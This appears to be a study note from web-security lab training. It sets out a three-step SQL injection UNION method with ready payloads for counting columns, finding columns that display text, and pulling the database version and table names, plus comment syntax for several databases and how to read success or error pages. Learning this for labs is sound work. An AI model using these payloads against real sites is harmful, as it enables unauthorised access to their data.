## UNION Attack Methodology — Use for Every UNION Lab

**Why UNION attacks work:**
UNION combines results of two SELECT queries into one result set
We inject a second SELECT that retrieves data we want

**Step 1 — Find number of columns:**
Start with 1 NULL, keep adding until no error appears:
'+UNION+SELECT+NULL--+
'+UNION+SELECT+NULL,NULL--+
'+UNION+SELECT+NULL,NULL,NULL--+
Stop when products appear on page = correct number of columns found

**Why NULL:**
NULL is compatible with any data type — string, integer, date, anything
Using a number or text might cause type mismatch errors
NULL always works regardless of column type

**Step 2 — Find which columns display text:**
Replace NULLs one by one with letter 'a':
'+UNION+SELECT+'a',NULL--+
'+UNION+SELECT+NULL,'a'--+
Whichever shows 'a' on page = that column accepts text output

**Step 3 — Extract what you want:**
Put your payload in the text column:
'+UNION+SELECT+@@version,NULL--+     MySQL version
'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+   all tables

**Database syntax differences:**
MySQL/MSSQL  →  --+  comment, @@version
Oracle       →  --   comment, v$version table, FROM DUAL required
PostgreSQL   →  --   comment, version() function

**This 3 step process works for every UNION lab. Never guess. Always follow the steps.**


## How to Identify UNION Errors vs Success

Error indicators:
- Blank white page
- Internal Server Error message  
- No products shown at all
- Application error visible on page

Success indicators:
- Products appear normally on page
- Page loads without breaking
- Your injected data appears somewhere on page

Rule: If page loads = accepted. If page breaks = wrong syntax or wrong column count.